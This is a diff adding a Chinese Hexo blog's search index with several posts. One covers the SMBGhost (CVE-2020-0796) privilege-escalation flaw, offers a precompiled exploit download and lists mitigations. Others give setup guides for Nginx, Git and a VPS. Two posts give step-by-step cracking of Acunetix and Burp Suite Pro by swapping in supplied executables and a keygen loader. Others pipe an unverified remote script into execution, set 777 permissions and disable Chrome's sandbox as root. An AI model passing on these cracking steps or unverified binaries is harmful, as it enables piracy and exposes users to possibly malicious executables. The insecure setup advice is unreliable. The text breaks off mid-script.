@@ -1,0 +1,434 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CVE-2020-0796本地提权</title>
+      <link href="/archives/57083/"/>
+      <url>/archives/57083/</url>
+      
+        <content type="html"><![CDATA[<h2 id="CVE-2020-0796"><a href="#CVE-2020-0796" class="headerlink" title="CVE-2020-0796"></a>CVE-2020-0796</h2><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h6 id="CVE-2020-0796-Windows-SMBv3-客户端-服务器远程代码执行漏洞"><a href="#CVE-2020-0796-Windows-SMBv3-客户端-服务器远程代码执行漏洞" class="headerlink" title="CVE-2020-0796 | Windows SMBv3 客户端/服务器远程代码执行漏洞"></a>CVE-2020-0796 | Windows SMBv3 客户端/服务器远程代码执行漏洞</h6><p>Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在远程执行代码漏洞。成功利用此漏洞的攻击者可以获取在目标服务器或客户端上执行代码的能力。</p><p>要利用针对服务器的漏洞，未经身份验证的攻击者可以将特制数据包发送到目标 SMBv3 服务器。要利用针对客户端的漏洞，未经身份验证的攻击者将需要配置恶意的 SMBv3 服务器，并说服用户连接到该服务器。</p><p>此安全更新通过更正 SMBv3 协议处理这些特制请求的方式来修复此漏洞</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Windows 10版本1903（用于32位系统）</p><p>Windows 10版本1903（用于基于ARM64的系统）</p><p>Windows 10版本1903（用于基于x64的系统）</p><p>Windows 10版本1909（用于32位系统）</p><p>Windows 10版本1909（用于基于ARM64的系统）</p><p>Windows 10版本1909（用于）基于x64的系统</p><p>Windows Server 1903版（服务器核心安装）</p><p>Windows Server 1909版（服务器核心安装）</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p><p><a href="https://github.com/ClarotyICS/CVE2020-0796" target="_blank" rel="noopener">https://github.com/ClarotyICS/CVE2020-0796</a></p><h2 id="本地提权-POC"><a href="#本地提权-POC" class="headerlink" title="本地提权-POC"></a>本地提权-POC</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><h4 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h4><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p><h4 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h4><p><a href="https://github.com/ZecOps/CVE-2020-0796-LPE-POC" target="_blank" rel="noopener">https://github.com/ZecOps/CVE-2020-0796-LPE-POC</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h3><p><img src="https://i.loli.net/2020/03/31/dBv6eFzTMUrwina.png" alt=""></p><h4 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h4><p><img src="https://i.loli.net/2020/03/31/hFMOs6nTj9paGm2.gif" alt=""></p><p>已编译好的文件</p><p><a href="/misc/cve-2020-0796-local.exe">cve-2020-0796-local.exe</a></p><p><a href="https://pan.baidu.com/s/1aaUO7_EX2m6fWUYcl30cZA" target="_blank" rel="noopener">https://pan.baidu.com/s/1aaUO7_EX2m6fWUYcl30cZA</a></p><p>MD5: A51599467EE9CB676F5C29EBE5AC8DF6<br>SHA-256: 11F4D4957090535E9F99ED305AEB3B2E6D28A5F5E495AE444EDB839C2FEFFB36</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p><img src="https://i.loli.net/2020/03/31/fMXzby6eAVro8FO.gif" alt=""></p><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><h4 id="1-禁用-SMBv3-压缩"><a href="#1-禁用-SMBv3-压缩" class="headerlink" title="1.禁用 SMBv3 压缩"></a>1.禁用 SMBv3 压缩</h4><p>您可以使用以下 PowerShell 命令禁用压缩功能，以阻止未经身份验证的攻击者利用<strong>SMBv3 服务器</strong>的漏洞。</p><pre><code>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force</code></pre><p><strong>注意：</strong></p><ol><li>进行更改后，无需重启。</li><li><strong>此解决方法不能阻止利用 SMB 客户端；请参阅常见问题解答下的第 2 项，以保护客户端。</strong></li><li>Windows 或 Windows Server 尚未使用 SMB 压缩，并且禁用 SMB 压缩不会产生负面的性能影响。</li></ol><p>你可以使用下面的 PowerShell 命令禁用该变通方法。</p><pre><code>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 0 -Force</code></pre><p><strong>注意：</strong> 禁用此解决方法后，无需重启。</p><h4 id="2-打补丁"><a href="#2-打补丁" class="headerlink" title="2.打补丁"></a>2.打补丁</h4><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762</a></p><h4 id="3-更新至2004"><a href="#3-更新至2004" class="headerlink" title="3.更新至2004"></a>3.更新至2004</h4><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 资源分享，漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo+Git+Nginx的配置</title>
+      <link href="/archives/63671/"/>
+      <url>/archives/63671/</url>
+      
+        <content type="html"><![CDATA[<h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>Ubuntu官方源里有nginx的稳定版，我这里选择最新版进行安装</p><p><a href="http://nginx.org/en/linux_packages.html#Ubuntu" target="_blank" rel="noopener">官方指南</a></p><h5 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h5><pre><code>echo "deb [arch=amd64 ] http://nginx.org/packages/mainline/ubuntu `lsb_release -cs` nginx" \    | sudo tee /etc/apt/sources.list.d/nginx.list</code></pre><h5 id="导入签名密钥"><a href="#导入签名密钥" class="headerlink" title="导入签名密钥"></a>导入签名密钥</h5><pre><code>curl -fsSL https://nginx.org/keys/nginx_signing.key | sudo apt-key add -</code></pre><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><pre><code>sudo apt updatesudo apt install nginx</code></pre><p><img src="https://i.loli.net/2020/03/13/COdYMJzj3PZDm7w.png" alt=""></p><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>Ubuntu官方源里有git的稳定版，我这里选择最新版进行安装</p><p><a href="https://git-scm.com/download/linux" target="_blank" rel="noopener">官方指南</a></p><h5 id="使用add-apt-repository命令添加源（会自动导入密钥）"><a href="#使用add-apt-repository命令添加源（会自动导入密钥）" class="headerlink" title="使用add-apt-repository命令添加源（会自动导入密钥）"></a>使用add-apt-repository命令添加源（会自动导入密钥）</h5><pre><code>sudo add-apt-repository ppa:git-core/ppa</code></pre><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><pre><code>sudo apt updatesudo apt install git</code></pre><p><img src="https://i.loli.net/2020/03/13/F95UfXHuSsZzy8G.png" alt=""></p><h3 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h3><p>在vps上配置git，方便hexo deploy</p><p><a href="https://git-scm.com/book/zh/v2/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">官方指南</a></p><h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><pre><code>sudo adduser git</code></pre><p><img src="https://i.loli.net/2020/03/13/ZgDLfyja569oYlX.png" alt=""></p><h5 id="配置authorized-keys"><a href="#配置authorized-keys" class="headerlink" title="配置authorized_keys"></a>配置authorized_keys</h5><pre><code>su gitcdmkdir .ssh &amp;&amp; chmod 700 .sshtouch .ssh/authorized_keys &amp;&amp; chmod 600 .ssh/authorized_keys</code></pre><h5 id="导入用户id-rsa"><a href="#导入用户id-rsa" class="headerlink" title="导入用户id_rsa"></a>导入用户id_rsa</h5><p>详见<a href="https://xcxmiku.com/archives/a1f6425f/#toc-heading-10">VPS的配置与优化</a></p><h5 id="限制-Git-用户使用SSH登陆"><a href="#限制-Git-用户使用SSH登陆" class="headerlink" title="限制 Git 用户使用SSH登陆"></a>限制 Git 用户使用SSH登陆</h5><p>将git-shell添加到/etc/shells（git-shell的路径一般为/usr/bin/git-shell）</p><p><img src="https://i.loli.net/2020/03/13/E53hAwoMkQ69JxX.png" alt=""></p><p>把git默认的shell替换成git-shell</p><pre><code>sudo chsh git -s $(which git-shell)</code></pre><p>或者直接修改/etc/passwd文件，将</p><p>git:\x:1000:1000:,,,:/home/git:/bin/bash</p><p>改为</p><p>git:\x:1000:1000:,,,:/home/git:/usr/bin/git-shell</p><h3 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h3><h5 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h5><pre><code>cd /home/git/git init --bare blog.git</code></pre><h5 id="更改权限"><a href="#更改权限" class="headerlink" title="更改权限"></a>更改权限</h5><pre><code>sudo chown -R git:git blog.git</code></pre><h5 id="测试git-clone"><a href="#测试git-clone" class="headerlink" title="测试git clone"></a>测试git clone</h5><pre><code>git clone git@vpsip:~/blog.git </code></pre><p>如果修改ssh端口请使用以下命令（xxx为端口号）</p><pre><code>git clone ssh://git@vpsip:xxx/~/blog.git</code></pre><h5 id="建立tmp和blog目录"><a href="#建立tmp和blog目录" class="headerlink" title="建立tmp和blog目录"></a>建立tmp和blog目录</h5><pre><code>mkdir -p /home/git/tmpmkdir -p /home/git/blog</code></pre><h5 id="设置git-post-receive-钩子"><a href="#设置git-post-receive-钩子" class="headerlink" title="设置git post-receive 钩子"></a>设置git post-receive 钩子</h5><p>编辑/home/git/blog.git/hooks/post-receive文件</p><pre><code>#!/bin/bash -lGIT_REPO=/home/git/blog.gitTMP_GIT_CLONE=/home/git/tmpPUBLIC_WWW=/home/git/blogrm -rf ${TMP_GIT_CLONE}git clone $GIT_REPO $TMP_GIT_CLONErm -rf ${PUBLIC_WWW}cp -rf ${TMP_GIT_CLONE} ${PUBLIC_WWW}</code></pre><h5 id="修改各个文件夹权限"><a href="#修改各个文件夹权限" class="headerlink" title="修改各个文件夹权限"></a>修改各个文件夹权限</h5><pre><code>chmod +x /home/git/blog.git/hooks/post-receivechmod 777 -R /home/git/blog.gitchmod 777 -R /home/git/blogchmod a+r /home/git/blogchmod 777 -R /home/git/tmpchown -R git:git /home/git/</code></pre><h3 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h3><p>修改_config.yml文件里的deploy字段</p><pre><code>deploy:- type: git  repository: git@vpsip:~/blog.git  branch: master</code></pre><p>如果修改ssh端口请将repository修改为（xxx为端口号）</p><pre><code>ssh://git@vpsip:xxx/~/blog.git</code></pre><h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><p>推荐直接使用digitalocean的nginx在线配置生成</p><p><a href="https://www.digitalocean.com/community/tools/nginx" target="_blank" rel="noopener">链接</a>   <a href="https://github.com/digitalocean/nginxconfig.io" target="_blank" rel="noopener">源码</a></p><p><img src="https://i.loli.net/2020/03/14/tTfH2Dmph5uCaZM.png" alt=""></p><p>按顺序填写完需求后，下载配置文件至vps，解压即可，也可自行复制粘贴</p><p>Nginx全局配置文件为/etc/nginx/nginx.conf，为了防止错误修改全局文件，我选择修改/etc/nginx/conf.d文件夹里的子项目配置文件default.conf</p><p>配置SSL和网站路径</p><pre><code>server{    listen 443; #监听443端口    server_name xxxx.com; #配置域名    ssl on; #开启SSL    ssl_certificate domain.cert; #证书    ssl_certificate_key private.key; #私钥    location / {        root  /home/git/blog; #网站路径        index  index.html index.htm;    }      }</code></pre><p>配置HTTP跳转至HTTPS</p><pre><code>server {    listen 80; #监听443端口    server_name xxxx.com; #配置域名    return 301 https://$server_name$request_uri; #跳转}</code></pre><p>防止列目录</p><pre class=" language-bash"><code class="language-bash">http <span class="token punctuation">{</span>autoindex off<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>不知响应头里显示nginx版本号</p><pre class=" language-bash"><code class="language-bash">http <span class="token punctuation">{</span>server_tokens off<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>配置完后使用</p><pre><code>nginx -t</code></pre><p>检测是否有误</p><p><img src="https://i.loli.net/2020/03/14/CqTMSrveymkOa4Q.png" alt=""></p><p>启动nginx</p><pre><code>systemctl enable nginxsystemctl start nginxnginx -s reload</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>第一笔加密货币(ETH)交易</title>
+      <link href="/archives/991371b6/"/>
+      <url>/archives/991371b6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="交易记录"><a href="#交易记录" class="headerlink" title="交易记录"></a><a href="https://etherchain.org/tx/0x3074afacd5d2450c5aa58264ed26e64bc8677a6f62d699911a82b59c98bd15df" target="_blank" rel="noopener">交易记录</a></h2><p><img src="https://i.loli.net/2020/03/08/KDmsLbe384hV6rj.png" alt=""></p><p>用于购买<a href="https://porkbun.com/" target="_blank" rel="noopener">Porkbun</a>的域名</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 加密货币 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 加密货币 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Root用户下运行Google Chrome</title>
+      <link href="/archives/2e214463/"/>
+      <url>/archives/2e214463/</url>
+      
+        <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/linux/sandboxing.md" target="_blank" rel="noopener">chromium的沙盒机制(sandbox)</a>无法在root用户下运行</p><p><img src="https://i.loli.net/2020/03/06/JcavdFy9s1DZx3I.png" alt=""></p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>在命令行下输入如下代码即可启动</p><pre><code>google-chrome --no-sandbox</code></pre><p>如需通过桌面图标启动，请修改/usr/share/applications/google-chrome.desktop文件</p><pre><code>Exec=/usr/bin/google-chrome-stable %U</code></pre><p>改为</p><pre><code>Exec=/usr/bin/google-chrome-stable --no-sandbox %U </code></pre><p>有三处，都添加–no-sandbox即可</p><p><img src="https://i.loli.net/2020/03/06/HzcjWK4LXEqpumn.png" alt=""></p><p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png" alt=""></p><p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 技术分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>VPS的配置与优化</title>
+      <link href="/archives/a1f6425f/"/>
+      <url>/archives/a1f6425f/</url>
+      
+        <content type="html"><![CDATA[<p>因为某些原因重装了VPS，简单记录下重装后的配置。</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>推荐一个颜值很高且多终端同步的SSH客户端<a href="https://termius.com/" target="_blank" rel="noopener">Termius</a></p><p><img src="https://i.loli.net/2020/03/05/Bv2ygLfKASeERlZ.png" alt=""></p><p>vps上重装的系统是Ubuntu 18.04 LTS Server - 64 Bit </p><h3 id="配置与优化"><a href="#配置与优化" class="headerlink" title="配置与优化"></a>配置与优化</h3><h4 id="更新源和软件"><a href="#更新源和软件" class="headerlink" title="更新源和软件"></a>更新源和软件</h4><pre><code>apt updateapt upgrade</code></pre><h4 id="将语言设置为中文"><a href="#将语言设置为中文" class="headerlink" title="将语言设置为中文"></a>将语言设置为中文</h4><pre><code>dpkg-reconfigure locales</code></pre><p><img src="https://i.loli.net/2020/03/05/wu8cT5Ja1HqLVUS.png" alt=""></p><p>用空格选择全部zh开头的选项（也可只选择 zh_CN.UTF-8）</p><p><img src="https://i.loli.net/2020/03/05/dJeg3DIp4CiMTB8.png" alt=""></p><p>设置系统默认语言为 zh_CN.UTF-8</p><p><img src="https://i.loli.net/2020/03/05/ABkwtDFj37EScK1.png" alt=""></p><p>重新连接后默认语言就是中文了</p><h4 id="修改时区"><a href="#修改时区" class="headerlink" title="修改时区"></a>修改时区</h4><pre><code>timedatectl set-timezone Asia/Shanghai </code></pre><h4 id="修改vps默认的root密码"><a href="#修改vps默认的root密码" class="headerlink" title="修改vps默认的root密码"></a>修改vps默认的root密码</h4><pre><code>passwd root</code></pre><p><img src="https://i.loli.net/2020/03/05/IM3abWGiB5nwulD.png" alt=""></p><h4 id="安装常用工具"><a href="#安装常用工具" class="headerlink" title="安装常用工具"></a>安装常用工具</h4><pre><code>apt install vim wget git </code></pre><h4 id="安装BBR-锐速"><a href="#安装BBR-锐速" class="headerlink" title="安装BBR/锐速"></a>安装BBR/锐速</h4><pre><code>wget -N --no-check-certificate "https://github.000060000.xyz/tcpx.sh" &amp;&amp; chmod +x tcpx.sh &amp;&amp; ./tcpx.sh</code></pre><p><img src="https://i.loli.net/2020/03/05/gdji4FrqzLhTY3M.png" alt=""></p><p>详见<a href="https://github.com/ylx2016/Linux-NetSpeed/releases" target="_blank" rel="noopener">Linux-NetSpeed</a></p><h4 id="修改SSH端口"><a href="#修改SSH端口" class="headerlink" title="修改SSH端口"></a>修改SSH端口</h4><pre><code>vim /etc/ssh/sshd_config</code></pre><p>在原本的Port 22下面加一行（可能是注释的，请删除#号）</p><p>Port 2233 2233为需要修改的端口</p><p><img src="https://i.loli.net/2020/03/06/sGKhCXPgHTwIkaL.png" alt=""></p><p>重启服务</p><pre><code>systemctl restart sshd</code></pre><p>查看是否监听了修改的端口</p><pre><code>netstat -ntl</code></pre><p>使用修改后的端口连接ssh</p><pre><code>ssh -p 2233 root@127.0.0.1</code></pre><p>如果无误，可将前面的Port 22注释掉</p><h4 id="配置免密登录"><a href="#配置免密登录" class="headerlink" title="配置免密登录"></a>配置免密登录</h4><h5 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h5><pre><code>ssh-keygen -t rsa</code></pre><p><img src="https://i.loli.net/2020/03/06/rKNmMd3SO1iITXb.png" alt=""></p><p>按提示输入即可（也可一直回车使用空密码）</p><p>公钥文件存储在C:\Users\15627.ssh\id_rsa.pub</p><h5 id="将密钥上传至服务器"><a href="#将密钥上传至服务器" class="headerlink" title="将密钥上传至服务器"></a>将密钥上传至服务器</h5><p>Linux下可直接使用ssh-copy-id</p><pre><code>语法ssh-copy-id [-i [identity_file]] [user@]machine例子ssh-copy-id -i ~/.ssh/id_rsa.pub root@127.0.0.1</code></pre><p><img src="https://i.loli.net/2020/03/06/TSQKWMfOhbw9Fn5.png" alt=""></p><p>Windows下目前没有自带ssh-copy-id，可使用scp</p><pre><code>语法scp [参数] [原路径] [目标路径]例子scp C:\Users\usernmae\.ssh\id_rsa.pub root@127.0.0.1:~/.ssh/win.pub</code></pre><p><img src="https://i.loli.net/2020/03/06/LtNS9aPdEY7B3vs.png" alt=""></p><p>然后使用ssh连接服务器将win.pub添加至authorized_keys</p><pre><code>cd /root/.ssh &amp;&amp; cat win.pub &gt;&gt; authorized_keys</code></pre><p>即可免密登录vps</p><h5 id="配置第三方软件免密登录"><a href="#配置第三方软件免密登录" class="headerlink" title="配置第三方软件免密登录"></a>配置第三方软件免密登录</h5><p><a href="https://www.netsarang.com/zh/xshell/" target="_blank" rel="noopener">Xshell</a></p><p>菜单栏→工具→用户密钥管理者</p><p><img src="https://i.loli.net/2020/03/06/yAWoQBiHdCfUpF7.png" alt=""></p><p>在用户密钥处导入id_rsa</p><p><img src="https://i.loli.net/2020/03/06/IupVstZ5hENKW8R.png" alt=""></p><p>在用户身份验证中，方法选择Public Key，密钥选择刚导入的id_rsa即可</p><p><img src="https://i.loli.net/2020/03/06/YWtmJD1qTL6zNid.png" alt=""></p><p><a href="https://termius.com/" target="_blank" rel="noopener">Termius</a></p><p>菜单栏→Keychain</p><p><img src="https://i.loli.net/2020/03/06/CtAB6rNzFJdgMD5.png" alt=""></p><p>在Keychain里选择NEW KEY，在Add Key的Label*处取个名，在Private Key*点击File导入id_rsa并保存</p><p><img src="https://i.loli.net/2020/03/06/kwb2YNRlATGWexU.png" alt=""></p><p>在连接设置里选择刚导入的key即可</p><p><img src="https://i.loli.net/2020/03/06/qcxwvZa4dhIWpso.png" alt=""></p><h4 id="安装V2ray"><a href="#安装V2ray" class="headerlink" title="安装V2ray"></a>安装V2ray</h4><p>具体参考</p><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC" target="_blank" rel="noopener">V2Ray一键安装脚本</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>acunetix_13.0.200205121安装与破解</title>
+      <link href="/archives/41a0b815/"/>
+      <url>/archives/41a0b815/</url>
+      
+        <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="/misc/">acunetix_13.0.200205121.zip</a></p><p>包含acunetix_13.0.200205121.exe，license_info.json，wvsc.exe以及安装说明.txt</p><p>SHA1：DEDF04A16B6A61174072A2DE5372DBB2CCD045B9</p><p>MD5：7F6A60A04C8D936E49690C43EA1C93CE</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>运行acunetix_13.0.200205121.exe安装awvs13</p><p><img src="https://i.loli.net/2020/02/18/ROPVMuGzKTyr1Aj.png" alt=""></p><p>复制wvsc.exe到“C:\Program Files (x86)\Acunetix\13.0.200205121\”下覆盖同名文件（如果安装时修改了安装路径，请更改为修改后的路径）</p><p><img src="https://i.loli.net/2020/02/18/v5C4ekYT7638ynJ.png" alt=""></p><p>复制license_info.json到“C:\ProgramData\Acunetix\shared\license”下覆盖同名文件</p><p><img src="https://i.loli.net/2020/02/18/rgvB9Z81dOKuPTC.png" alt=""></p><p>如果没有C:\ProgramData目录，请打开显示隐藏项目</p><p><img src="https://i.loli.net/2020/02/18/WLOXEoyiCmYTRqn.png" alt=""></p><p>可禁用Acunetix和Acunetix Database这两个服务，让awvs不开机自启，想使用是再启用即可（win10可直接在任务管理器启动服务）</p><p><img src="https://i.loli.net/2020/02/18/p95nrJmPxh1ikuF.png" alt=""></p><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img src="https://i.loli.net/2020/02/18/wNFGX71nSlILhT9.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 资源分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Burp Suite v2020.2.1的汉化以及无cmd框启动</title>
+      <link href="/archives/38a7a949/"/>
+      <url>/archives/38a7a949/</url>
+      
+        <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>最近几个burp suite的破解版都来源于四叔</p><p><a href="http://scz.617.cn:8/misc/201910151519.txt" target="_blank" rel="noopener">http://scz.617.cn:8/misc/201910151519.txt</a></p><p><a href="https://www.52pojie.cn/thread-1038295-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1038295-1-1.html</a></p><p>以下是我打包的版本（包括图标，汉化包，启动的bat和vbs， <a href="https://github.com/bit4woo/knife" target="_blank" rel="noopener">knife插件</a>）</p><p><a href="https://pan.baidu.com/s/1Q8M8Fq_uIvMhr6s6Fyfycg" target="_blank" rel="noopener">Burp_Suite_Pro_v2020.2.1.zip</a>  提取码: ssnb</p><table><thead><tr><th align="left">算法</th><th>哈希值</th></tr></thead><tbody><tr><td align="left">SHA256</td><td>2E511B3602F4859CCB5E5604E3697AB0BCA84561B0E3FF0755AC8A0204D88019</td></tr><tr><td align="left">MD5</td><td>699210589DC72FAA5C0A6EABC9D0BEA5</td></tr></tbody></table><p>或者下载以下的原版jar</p><p><a href="https://mega.nz/#!hB5XwRrK!SavleJzp0FKl71TCkvtqpEhZGQ9wYLlRxnAKYoHVlZs" target="_blank" rel="noopener">burpsuite_pro_v2020.2.1.jar</a></p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>7e95e1cec919419db62b73e50d74e6feaf70755ec828562cb22343fef433c1df</td></tr><tr><td>MD5</td><td>f6b13a530b592fdc083373db6e89e41a</td></tr></tbody></table><p><a href="https://portswigger.net/burp/releases" target="_blank" rel="noopener">官网</a></p><p><img src="https://i.loli.net/2020/03/26/rRQDwybjOdAnMSP.png" alt=""></p><p><a href="http://scz.617.cn/private/burp-loader-keygen-2020_2_1.jar_568321911fea077bc290bd9914b73402" target="_blank" rel="noopener">burp-loader-keygen-2020_2_1.jar</a></p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>74893842a782238f52f0f225c06fa744568321911fea077bc290bd9914b73402</td></tr><tr><td>MD5</td><td>e646b3eef03efba637e6ed794ced4114</td></tr></tbody></table><h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>原版启动的bat为</p><pre><code>java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_2_1.jar -jar burpsuite_pro_v2020.2.1.jar</code></pre><p>加载汉化包即可汉化</p><pre><code>java -noverify -Dfile.encoding=utf-8 -javaagent:BurpSuiteChs.jar -Xbootclasspath/p:burp-loader-keygen-2020_2_1.jar -Xmx1024m -jar burpsuite_pro_v2020.2.1.jar</code></pre><h2 id="无cmd框启动"><a href="#无cmd框启动" class="headerlink" title="无cmd框启动"></a>无cmd框启动</h2><p>使用vbs脚本调用bat即可</p><pre><code>Set shell = Wscript.createobject("wscript.shell")a = shell.run ("startCN.bat",0)</code></pre><h2 id="创建桌面图标"><a href="#创建桌面图标" class="headerlink" title="创建桌面图标"></a>创建桌面图标</h2><p>桌面右键，新建快捷方式，指定vbs脚本，然后更改图标即可</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>桌面图标</p><p><img src="https://i.loli.net/2019/12/02/dpcsBjo9NyPVnLO.png" alt=""></p><p>最终效果</p><p><img src="https://i.loli.net/2020/03/26/3bzJufiOkQPMHdT.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            